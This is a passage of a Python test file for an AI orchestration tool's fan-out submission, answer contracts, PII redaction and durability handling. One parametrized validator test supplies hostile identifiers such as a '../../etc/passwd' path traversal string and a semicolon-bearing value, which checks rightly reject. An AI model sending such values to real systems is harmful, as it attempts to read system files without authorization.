            "session_id": "sess-prompt",
            "question_identity": "interview-question:0123456789abcdef",
            "question": "Which plan tier do most active users hit?",
            "lanes": [dict(lane) for lane in advisory["lanes"]],
        }
    )
    data_prompt = next(
        payload.prompt for payload in payloads if payload.context["lane_id"] == "data_context"
    )
    aggregate = _data_context_answer_contract()["response_model_schema"]["$defs"]["aggregate"]
    policy = _data_context_lane_policy()

    # Fields the instructions may name are the fields the schema declares.
    assert "unit" not in aggregate["properties"]
    for stale in ("number with a unit", "aggregates and summaries", "allowed_units"):
        assert stale not in data_prompt, stale
    assert "allowed_units" not in policy["evidence_policy"]
    # And the instruction names what the schema actually requires.
    assert "count of rows" in data_prompt
    assert "execution_status" in data_prompt

    # The FALLBACK instruction is rendered when a declared contract cannot be
    # delivered, and it is enforced against the same published schema — so it
    # must agree too (round-56: it still asked for a unit).
    oversized = {
        "contract_id": "data_evidence_answer.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {
                f"field_{index}": {"type": "string", "description": "x" * 300}
                for index in range(80)
            },
        },
    }
    fallback_lane = dict(
        next(lane for lane in advisory["lanes"] if lane["lane_id"] == "data_context")
    )
    fallback_lane["answer_contract"] = oversized
    fallback_prompt = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-prompt-fallback",
            "question_identity": "interview-question:0123456789abcdef",
            "question": "Which plan tier do most active users hit?",
            "lanes": [fallback_lane],
        }
    )[0].prompt
    for stale in ("number with a unit", "allowed_units"):
        assert stale not in fallback_prompt, stale
    assert "count of rows" in fallback_prompt


def test_round56_unretained_content_is_missing_not_received(tmp_path: Any) -> None:
    """A summary is bookkeeping, not an answer — so the lane stays missing."""
    import json as json_module

    from ouroboros.contracts.data_evidence import _aggregate_shape_problems
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    # B2 — a row count has a plausible ceiling, so a PAN cannot wear the field.
    assert _aggregate_shape_problems({"number": 4111111111111111})
    assert _aggregate_shape_problems({"number": 4200}) == []
    assert _aggregate_shape_problems({"number": 1_000_000_000_000}) == []

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-56", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    data_result = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }

    # B1 — sent early, then not resent: the lane is missing, not completed.
    assert (
        submit_fanout_results(
            registry,
            session_id="sess-56",
            correlation_key="context.lane_id",
            results=[{"key": "data_context", "content": data_result}],
            fanout_id=fanout_id,
            finalize=False,
        )["status"]
        == "accumulated"
    )
    closing = submit_fanout_results(
        registry,
        session_id="sess-56",
        correlation_key="context.lane_id",
        results=[
            {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
            for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
        ],
        fanout_id=fanout_id,
    )
    assert closing["status"] == "complete"
    assert "data_context" in closing["missing_optional_keys"]
    assert "Growth leads" not in json_module.dumps(closing)

    # Resent in the finalizing call — the normal path — it is a real result.
    single = FanoutRegistry(tmp_path / "single")
    single_id = register_question_advisory_fanout_from_lanes(
        single, session_id="sess-56b", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert single_id is not None
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": data_result})
    out = submit_fanout_results(
        single,
        session_id="sess-56b",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=single_id,
    )
    assert out["status"] == "complete"
    assert "data_context" not in out["missing_optional_keys"]
    assert "Growth leads" in json_module.dumps(out)


def test_round56_configured_tools_round_trip_to_evidence(monkeypatch: Any) -> None:
    """A hint that survives configuration is never rejected as a source."""
    from ouroboros.mcp.tools.authoring_handlers import _advisory_lanes_with_known_data_tools
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    monkeypatch.setenv("OUROBOROS_KNOWN_DATA_TOOLS", "metrics_4111111111111111,clickhouse_query")
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = _advisory_lanes_with_known_data_tools(advisory)
    data_lane = next(lane for lane in lanes if lane["lane_id"] == "data_context")
    assert data_lane["known_data_tools"] == ["clickhouse_query"]


def test_round57_delivery_is_not_recovery_but_is_not_a_dead_end(tmp_path: Any) -> None:
    """Content that was never retained cannot be replayed — but can be resent."""
    import json as json_module

    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-57", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    data_result = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": data_result})
    complete = submit_fanout_results(
        registry,
        session_id="sess-57",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert complete["status"] == "complete"
    assert '"number": 42' in json_module.dumps(complete)

    # An empty retry replays honestly: no measurement, and it says why.
    replay = submit_fanout_results(
        registry,
        session_id="sess-57",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "already_complete"
    assert replay["consent_status"] == "not_confirmable_prose_not_retained"
    assert '"number": 42' not in json_module.dumps(replay)

    # A host that still holds the child output is not stuck: resubmitting the
    # lane returns it unchanged, and nothing enters durable state.
    resent = submit_fanout_results(
        registry,
        session_id="sess-57",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": data_result}],
        fanout_id=fanout_id,
    )
    assert resent["resubmitted_keys"] == ["data_context"]
    assert '"number": 42' in json_module.dumps(resent)
    assert '"number": 42' not in (tmp_path / f"{fanout_id}.json").read_text()


def test_round58_resubmission_uses_the_same_door(tmp_path: Any) -> None:
    """A completed fan-out validates a resend exactly as a first submission."""
    import json as json_module

    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-58", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    conforming = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": conforming})
    assert (
        submit_fanout_results(
            registry,
            session_id="sess-58",
            correlation_key="context.lane_id",
            results=results,
            fanout_id=fanout_id,
        )["status"]
        == "complete"
    )

    # A resend carrying what a first submission would refuse is refused here.
    hostile = {
        **conforming,
        "requires_user_confirmation": False,
        "finding": "alice@example.com rows: a,b,c / d,e,f",
    }
    refused = submit_fanout_results(
        registry,
        session_id="sess-58",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": hostile}],
        fanout_id=fanout_id,
    )
    assert refused["resubmitted_keys"] == []
    assert refused["resubmission_contract_violations"]
    assert "alice@example.com" not in json_module.dumps(refused)

    # A conforming resend still comes back unchanged.
    accepted = submit_fanout_results(
        registry,
        session_id="sess-58",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": conforming}],
        fanout_id=fanout_id,
    )
    assert accepted["resubmitted_keys"] == ["data_context"]
    assert '"number": 42' in json_module.dumps(accepted)


def test_round58_accumulation_reports_what_it_keeps(tmp_path: Any) -> None:
    """finalize=false must not call a discarded lane 'received'."""
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-58b", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-58b",
        correlation_key="context.lane_id",
        results=[
            {"key": "code_context", "content": {"lane_id": "code_context", "finding": "ok"}},
            {
                "key": "data_context",
                "content": {
                    "lane_id": "data_context",
                    "data_needed": True,
                    "finding": "Growth leads.",
                    "confidence": "reported_by_tool",
                    "evidence": [_typed_evidence()],
                    "proposed_queries": [],
                    "requires_user_confirmation": True,
                    "caveats": ["Point-in-time."],
                },
            },
        ],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert out["status"] == "accumulated"
    assert out["received_keys"] == ["code_context"]
    assert out["not_retained_keys"] == ["data_context"]


def test_round58_both_transports_deliver_the_enforced_fallback() -> None:
    """Neither transport may summarize a contract it enforces."""
    from ouroboros.mcp.tools.subagent import _plugin_advisory_contract_section
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    oversized = {
        "contract_id": "data_evidence_answer.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {
                f"field_{index}": {"type": "string", "description": "x" * 300}
                for index in range(80)
            },
        },
    }
    lanes = [dict(lane) for lane in advisory["lanes"]]
    for lane in lanes:
        if lane["lane_id"] == "data_context":
            lane["answer_contract"] = oversized

    host_prompt = next(
        payload.prompt
        for payload in build_interview_question_advisory_subagents(
            {
                "session_id": "sess-fb",
                "question_identity": "interview-question:0123456789abcdef",
                "question": "Which plan tier do most active users hit?",
                "lanes": lanes,
            }
        )
        if payload.context["lane_id"] == "data_context"
    )
    plugin_section = _plugin_advisory_contract_section("fanout-1", {**advisory, "lanes": lanes})

    required = (
        "data_needed",
        "finding",
        "confidence",
        "observed_at",
        "execution_status",
        "caveats",
        "source_class",
    )
    for rendered, name in ((host_prompt, "host"), (plugin_section, "plugin")):
        for field in required:
            assert field in rendered, f"{name} fallback omits {field}"


def test_round59_metadata_publishes_what_is_enforced() -> None:
    """Structured metadata may not say "not enforced" about an enforced form."""
    from ouroboros.contracts.data_evidence import _data_context_answer_contract
    from ouroboros.mcp.tools.subagent import (
        UNENFORCED_CONTRACT_FIELD,
        lanes_with_published_contracts,
    )

    oversized = {
        "contract_id": "data_evidence_answer.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {
                f"field_{index}": {"type": "string", "description": "x" * 300}
                for index in range(80)
            },
        },
    }
    published = {
        lane["lane_id"]: lane
        for lane in lanes_with_published_contracts(
            [
                {
                    "lane_id": "data_context",
                    "purpose": "p",
                    "capability": "call_mcp",
                    "required": False,
                    "answer_contract": oversized,
                },
                {
                    "lane_id": "additive_lane",
                    "purpose": "p",
                    "capability": "future",
                    "required": False,
                    # Its OWN contract id. Reusing the reserved one here now
                    # means "bind the canonical contract" (round-70), which is
                    # a different property from the one this test pins.
                    "answer_contract": {**oversized, "contract_id": "future_additive.v1"},
                },
            ]
        )
    }
    # Registration substitutes the published data contract, so the metadata
    # publishes it too.
    assert published["data_context"]["answer_contract"] == _data_context_answer_contract()
    assert UNENFORCED_CONTRACT_FIELD not in published["data_context"]
    # An additive lane really is unenforced, and still says so.
    assert UNENFORCED_CONTRACT_FIELD in published["additive_lane"]
    assert "answer_contract" not in published["additive_lane"]


def test_round59_plugin_prompt_states_the_completion_rule() -> None:
    """The only prompt the bridge delivers must say what completion requires."""
    from ouroboros.mcp.tools.subagent import build_interview_subagent
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    payload = build_interview_subagent(
        session_id="sess-plugin",
        action="start",
        initial_context="ctx",
        advisory_fanout_id="fanout-1",
        advisory_fanout_contract=advisory,
    )
    prompt = payload.prompt
    assert "required=true" in prompt
    assert "no-op" in prompt
    assert "permanently partial" in prompt
    # The compatibility rules a host needs are stated, not left implicit.
    assert "unsupported capability" in prompt
    assert "never skipped" in prompt


def test_round61_resubmission_is_the_submission_path(tmp_path: Any) -> None:
    """One door means one door: same normalization, and consent follows it."""
    import json as json_module

    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-61", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    data_result = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": data_result})
    assert (
        submit_fanout_results(
            registry,
            session_id="sess-61",
            correlation_key="context.lane_id",
            results=results,
            fanout_id=fanout_id,
        )["status"]
        == "complete"
    )

    # Without a resubmission the replay is still unconfirmable.
    bare = submit_fanout_results(
        registry,
        session_id="sess-61",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert bare["consent_status"] == "not_confirmable_prose_not_retained"

    # B1 — a conforming resubmission puts the narrative back, so the response
    # says it may be forwarded rather than forcing the host to discard it.
    for content in (data_result, json_module.dumps(data_result)):
        restored = submit_fanout_results(
            registry,
            session_id="sess-61",
            correlation_key="context.lane_id",
            results=[{"key": "data_context", "content": content}],
            fanout_id=fanout_id,
        )
        # B2 — JSON text is normalized exactly as on a first submission.
        assert restored["resubmitted_keys"] == ["data_context"], content
        assert restored["consent_status"] == "confirmable_resubmitted"
        assert "Growth leads" in json_module.dumps(restored)

    # Nothing any of this touched entered durable state.
    assert "Growth leads" not in (tmp_path / f"{fanout_id}.json").read_text()


def test_round62_resubmission_is_scoped_by_registered_contract(tmp_path: Any) -> None:
    """What a lane IS comes from registration, never from a field in its value."""
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-62", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    data_result = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    # Generic lanes claim the marker themselves — it must buy them nothing.
    results = [
        {
            "key": lane,
            "content": {"lane_id": lane, "finding": "ok", "content_retained": False},
        }
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": data_result})
    assert (
        submit_fanout_results(
            registry,
            session_id="sess-62",
            correlation_key="context.lane_id",
            results=results,
            fanout_id=fanout_id,
        )["status"]
        == "complete"
    )

    spoof = submit_fanout_results(
        registry,
        session_id="sess-62",
        correlation_key="context.lane_id",
        results=[{"key": "code_context", "content": {"lane_id": "code_context", "finding": "ok"}}],
        fanout_id=fanout_id,
    )
    assert spoof["consent_status"] == "not_confirmable_prose_not_retained"
    assert not spoof.get("resubmitted_keys")

    genuine = submit_fanout_results(
        registry,
        session_id="sess-62",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": data_result}],
        fanout_id=fanout_id,
    )
    assert genuine["consent_status"] == "confirmable_resubmitted"
    assert genuine["resubmitted_keys"] == ["data_context"]


# --------------------------------------------------------------------------- #
# round-64 — hostile re-entry identifiers
# --------------------------------------------------------------------------- #


def test_round64_malformed_fanout_id_is_not_echoed(tmp_path: Any) -> None:
    """A malformed id is rejected at the door without carrying its own size.

    The submitted value used to be interpolated into the error, so a
    100,000-character id produced a 100,000-character error that the MCP
    frame, the host response, and every log line downstream then had to
    carry.
    """
    hostile = "x" * 100_000

    out = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id=hostile,
    )

    assert out["status"] == "unknown_fanout_id"
    assert hostile not in out["error"]
    assert "x" * 200 not in out["error"]
    assert len(out["error"]) < 500
    assert hostile not in str(out)


@pytest.mark.parametrize(
    "hostile",
    [
        "../../etc/passwd",
        "/absolute/path",
        "has space",
        "semi;colon",
        "",
        "y" * 129,
    ],
)
def test_round64_identifier_grammar_is_enforced_before_routing(
    tmp_path: Any,
    hostile: str,
) -> None:
    out = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id=hostile,
    )
    assert out["status"] == "unknown_fanout_id"
    assert hostile not in out.get("error", "") or not hostile


def test_round64_wellformed_unknown_id_still_names_itself(tmp_path: Any) -> None:
    """The bound must not cost the diagnosis for ordinary mistakes.

    A grammar-valid id is at most 128 characters, so echoing it is bounded —
    and it is the only way a host can tell WHICH id it got wrong.
    """
    out = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id="fanout-that-expired-42",
    )
    assert out["status"] == "unknown_fanout_id"
    # The id is digested, not echoed (round-69), but it stays correlatable.
    assert "fanout-that-expired-42" not in out["error"]
    assert out["fanout_id"].startswith("<redacted-key sha256:")


def test_round64_grammar_has_one_definition() -> None:
    """The door reuses the registry's predicate instead of restating it."""
    assert FanoutRegistry.valid_fanout_id("a" * 128)
    assert not FanoutRegistry.valid_fanout_id("a" * 129)
    assert not FanoutRegistry.valid_fanout_id("../escape")
    assert not FanoutRegistry.valid_fanout_id("")


def test_round64_results_item_shape_is_published() -> None:
    """The shape the handler enforces is also the shape hosts are shown.

    An untyped array let a host discover the required item shape only by
    submitting a malformed batch.
    """
    definition = SubmitFanoutResultsHandler().definition
    schema = definition.to_input_schema()
    results = schema["properties"]["results"]

    assert results["type"] == "array"
    item = results["items"]
    assert item["type"] == "object"
    assert set(item["required"]) == {"key", "content"}
    assert item["properties"]["key"]["type"] == "string"
    assert item["properties"]["content"]["type"] == ["object", "string"]


# --------------------------------------------------------------------------- #
# round-64 — the published guarantee must describe the actual schema
# --------------------------------------------------------------------------- #


def _payload_defs() -> dict[str, Any]:
    from ouroboros.contracts.data_evidence import _schema_defs

    return dict(_schema_defs())


def _lane_policy() -> dict[str, Any]:
    from ouroboros.contracts.data_evidence import _data_context_lane_policy

    return _data_context_lane_policy()["evidence_policy"]


def test_round64_payload_defs_contain_no_free_text_field() -> None:
    """The scoped half of the response_shape guarantee, checked not asserted.

    ``engine_enforced.response_shape`` claims evidence and proposal payloads
    are typed. A string field added there later with no ``enum``, ``const``,
    or ``pattern`` would silently make that claim false again, so the claim
    is derived from the schema here rather than trusted.
    """
    unconstrained: list[str] = []

    def _walk(node: Any, path: str) -> None:
        if not isinstance(node, Mapping):
            return
        if node.get("type") == "string":
            if not any(key in node for key in ("enum", "const", "pattern")):
                unconstrained.append(path)
        for key, child in node.items():
            if key in {"properties", "$defs"} and isinstance(child, Mapping):
                for name, sub in child.items():
                    _walk(sub, f"{path}.{name}")
            elif key in {"items", "then", "if", "not"}:
                _walk(child, f"{path}.{key}")
            elif key == "allOf" and isinstance(child, list):
                for index, sub in enumerate(child):
                    _walk(sub, f"{path}.allOf[{index}]")

    for name, body in _payload_defs().items():
        _walk(body, name)

    assert unconstrained == [], (
        "these payload fields accept free text, so response_shape's "
        f"'typed' claim no longer holds for them: {unconstrained}"
    )


def test_round64_response_shape_guarantee_names_its_exception() -> None:
    """The guarantee must not read as 'the whole response is typed'.

    ``finding`` is REQUIRED free text. Hosts are told this block, not the
    prompt, is authoritative, so an unscoped claim could be read as "the
    response is PII-safe" — which the engine does not establish.
    """
    policy = _lane_policy()
    enforced = policy["engine_enforced"]
    shape = enforced["response_shape"]
    free_text_fields = policy["free_text_fields"]

    assert "finding" in free_text_fields
    assert "free_text_fields" in shape, (
        "response_shape must point at the fields it excludes, not claim the "
        f"whole response is typed: {shape!r}"
    )
    assert "defense-in-depth" in shape and "NOT as a guarantee" in shape
    assert shape != "typed structures only; no free text"


def test_round64_free_text_fields_are_never_retained() -> None:
    """The 'response only' half of the guarantee.

    The narrative is untrusted prose, so the claim that it never reaches
    durable state is what keeps it survivable.
    """
    from ouroboros.contracts.data_evidence import (
        data_evidence_retained_schema,
        redact_prose_for_persistence,
    )

    policy = _lane_policy()
    retained_properties = set(data_evidence_retained_schema()["properties"])

    for field_name in policy["free_text_fields"]:
        assert field_name not in retained_properties

    summary = redact_prose_for_persistence(
        {
            "lane_id": "data_context",
            "data_needed": True,
            "confidence": "high",
            "finding": "alice@example.com asked about churn",
            "caveats": ["contact bob@example.com"],
            "expected_decision": "call 010-1234-5678",
            "evidence": [],
            "proposed_queries": [],
            "requires_user_confirmation": True,
        }
    )
    serialized = str(summary)
    assert "alice@example.com" not in serialized
    assert "bob@example.com" not in serialized
    assert "010-1234-5678" not in serialized


# --------------------------------------------------------------------------- #
# round-65 — the honest failed lookup, and durability that is not overstated
# --------------------------------------------------------------------------- #


def _answer_schema() -> dict[str, Any]:
    from ouroboros.contracts.data_evidence import _data_context_answer_contract

    return _data_context_answer_contract()["response_model_schema"]


def _validate_answer(payload: dict[str, Any]) -> str | None:
    import jsonschema

    try:
        jsonschema.validate(payload, _answer_schema())
    except jsonschema.ValidationError as error:
        return error.message
    return None


def _failed_lookup_output() -> dict[str, Any]:
    return {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "The analytics lookup returned an error envelope; no count is available.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }


def test_round65_honest_failed_lookup_is_representable() -> None:
    """A relevant lane whose lookup failed must have something true to say.

    It holds no evidence — a failure is not a measurement — and may have no
    proposal to make. Before this, its only representable escape was to claim
    `data_needed=false`, misreporting relevance, which is the exact failure
    this contract exists to prevent.
    """
    assert _validate_answer(_failed_lookup_output()) is None


def test_round65_failure_state_does_not_loosen_the_other_branches() -> None:
    """The new branch is the no-evidence terminal, not a general escape."""
    # Claiming a tool reported something, with nothing executed, stays a
    # category error.
    reported_without_evidence = _failed_lookup_output() | {"confidence": "reported_by_tool"}
    assert _validate_answer(reported_without_evidence) is not None

    # "inferred" with nothing to infer from is still rejected: the branch is
    # keyed to no_evidence, which is the only confidence that means this.
    inferred_from_nothing = _failed_lookup_output() | {"confidence": "inferred"}
    assert _validate_answer(inferred_from_nothing) is not None

    # data_needed=false still forces the empty, no_evidence shape.
    irrelevant_but_confident = _failed_lookup_output() | {
        "data_needed": False,
        "confidence": "inferred",
    }
    assert _validate_answer(irrelevant_but_confident) is not None


def test_round65_prompt_states_the_representable_failure(tmp_path: Any) -> None:
    """The schema and the instruction must move together.

    Loosening the schema without telling the child leaves a compliant child
    still choosing between two false answers (the round-55 failure).
    """
    from ouroboros.contracts.data_evidence import _data_context_answer_contract

    instruction = _data_context_answer_contract()["runtime_instruction"]
    assert "confidence=no_evidence" in instruction
    assert "data_needed=true" in instruction
    assert "error envelope" in instruction


def test_round65_save_reports_unconfirmed_durability(tmp_path: Any, monkeypatch: Any) -> None:
    """`save()` must not claim durable persistence it did not get.

    The round-64 merge staged into a second temp and replaced it again, so the
    final rename's directory entry was never fsync'd, and the durability
    boolean was discarded on top of that.
    """
    import errno as _errno
    import stat as _stat

    from ouroboros.core import owner_only

    registry = FanoutRegistry(tmp_path)
    record = FanoutRecord(
        fanout_id="durability-probe",
        kind=FANOUT_KIND_LATERAL_PERSONA_PANEL,
        session_id="sess-65",
        correlation_key="context.persona",
        expected_keys=("researcher",),
        synthesizer_input={},
    )

    assert bool(registry.save(record)) is True

    real_fsync = owner_only.os.fsync

    def _fail_directory_fsync(fd: int) -> None:
        if _stat.S_ISDIR(os.fstat(fd).st_mode):
            raise OSError(_errno.EIO, "directory fsync failed")
        real_fsync(fd)

    monkeypatch.setattr(owner_only.os, "fsync", _fail_directory_fsync)

    assert bool(registry.save(record)) is False


def test_round65_single_rename_leaves_no_stray_temp(tmp_path: Any) -> None:
    """The record is written straight to its target, atomically, once."""
    registry = FanoutRegistry(tmp_path)
    record = FanoutRecord(
        fanout_id="single-rename",
        kind=FANOUT_KIND_LATERAL_PERSONA_PANEL,
        session_id="sess-65",
        correlation_key="context.persona",
        expected_keys=("researcher",),
        synthesizer_input={},
    )

    assert bool(registry.save(record)) is True

    written = sorted(path.name for path in tmp_path.iterdir())
    assert written == ["single-rename.json"]
    assert registry.load("single-rename") is not None


# --------------------------------------------------------------------------- #
# round-66 — durability is retryable; unavailability is not irrelevance
# --------------------------------------------------------------------------- #


def _persona_record(fanout_id: str) -> Any:
    return FanoutRecord(
        fanout_id=fanout_id,
        kind=FANOUT_KIND_LATERAL_PERSONA_PANEL,
        session_id="sess-66",
        correlation_key="context.persona",
        expected_keys=("researcher",),
        synthesizer_input={},
    )


def _fail_directory_fsync(monkeypatch: Any) -> None:
    import errno as _errno
    import stat as _stat

    from ouroboros.core import owner_only

    real_fsync = owner_only.os.fsync

    def _failing(fd: int) -> None:
        if _stat.S_ISDIR(os.fstat(fd).st_mode):
            raise OSError(_errno.EIO, "directory fsync failed")
        real_fsync(fd)

    monkeypatch.setattr(owner_only.os, "fsync", _failing)


def test_round66_unconfirmed_write_is_written_not_lost(tmp_path: Any, monkeypatch: Any) -> None:
    """`written` and `durable` are separate facts with separate recoveries.

    Reporting an unconfirmed flush as "not written" sent the host into a
    recovery that cannot work: the record is on disk and terminal, so the
    resubmission short-circuits.
    """
    registry = FanoutRegistry(tmp_path)
    record = _persona_record("durability-66")

    _fail_directory_fsync(monkeypatch)
    outcome = registry.save(record)

    assert outcome.written is True
    assert outcome.durable is False
    assert bool(outcome) is False  # non-terminal callers still see "resubmit"
    # The content really is readable — this is why "not persisted" was wrong.
    assert registry.load("durability-66") is not None


def test_round66_durability_is_retryable(tmp_path: Any, monkeypatch: Any) -> None:
    """The retry flushes again rather than rewriting content that is fine."""
    registry = FanoutRegistry(tmp_path)
    record = _persona_record("retry-66")

    _fail_directory_fsync(monkeypatch)
    assert registry.save(record).durable is False
    assert registry.confirm_durability("retry-66") is False

    monkeypatch.undo()
    # Same record, untouched content, and durability can now be established.
    assert registry.confirm_durability("retry-66") is True
    assert registry.load("retry-66") is not None


def test_round66_confirm_durability_refuses_absent_and_malformed(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    assert registry.confirm_durability("never-registered") is False
    assert registry.confirm_durability("../escape") is False
    assert registry.confirm_durability("z" * 129) is False


def test_round66_no_tool_access_does_not_misreport_relevance() -> None:
    """Unavailability is not irrelevance.

    The no-op form means `data_needed=false`. Telling a child with no MCP
    access to return it made a data-relevant question produce schema-valid
    state claiming the data was never needed.
    """
    from ouroboros.mcp.tools.subagent import build_interview_question_advisory_subagents

    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-66",
            "question_identity": "interview-question:00112233445566aa",
            "question": "How many enterprise accounts churned last quarter?",
            "user_question_first": True,
            "lanes": [{"lane_id": "data_context", "capability": "data_context", "required": False}],
        }
    )
    assert payloads, "no data_context payload was built"
    prompt = payloads[0].prompt

    assert "data_needed=true" in prompt
    assert "confidence=no_evidence" in prompt
    assert "never flip data_needed to false because you could not look" in prompt


# --------------------------------------------------------------------------- #
# round-67 — the data lane's contract follows its identity, not its declaration
# --------------------------------------------------------------------------- #


_HOSTILE_DATA_OUTPUT = {
    "lane_id": "data_context",
    "data_needed": True,
    "finding": "rows: alice@example.com, bob@example.com",
    "confidence": "reported_by_tool",
    "evidence": [{"source": "db", "value": "alice@example.com, 010-1234-5678"}],
    "proposed_queries": [],
    "requires_user_confirmation": False,
}


def _data_lane(**overrides: Any) -> dict[str, Any]:
